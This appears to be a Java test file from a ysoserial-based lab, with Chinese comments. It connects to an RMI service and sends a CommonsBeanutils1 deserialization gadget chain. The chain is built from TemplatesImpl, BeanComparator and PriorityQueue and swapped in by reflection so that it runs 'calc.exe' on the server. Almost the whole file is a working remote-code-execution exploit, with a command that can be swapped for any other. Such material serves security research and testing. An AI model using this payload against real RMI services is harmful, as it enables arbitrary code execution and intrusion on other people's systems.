package ysoserial.Test;


import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.PriorityQueue;


public class RMIClint {
    public static void main(String[] args) {
        try {
            HelloInter h = (HelloInter) Naming.lookup("rmi://0.0.0.0:1099/hello"); // 寻找RMI实例远程对象
//            System.out.println(h.Hello("run......"));
            h.Eeyi(getpayload());
//            h.Hello(getpayload());
//            h.TTTT();
        }catch (MalformedURLException e) {
            System.out.println("url格式异常");
        } catch (RemoteException e) {
            System.out.println("创建对象异常");
        } catch (NotBoundException e) {
            System.out.println("对象未绑定");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static Object getpayload() throws Exception{

        final Object templates = Gadgets.createTemplatesImpl("calc.exe");
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
//		Reflections.setFieldValue(comparator, "property", "outputProperties");
        comparator.setProperty("outputProperties");
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}
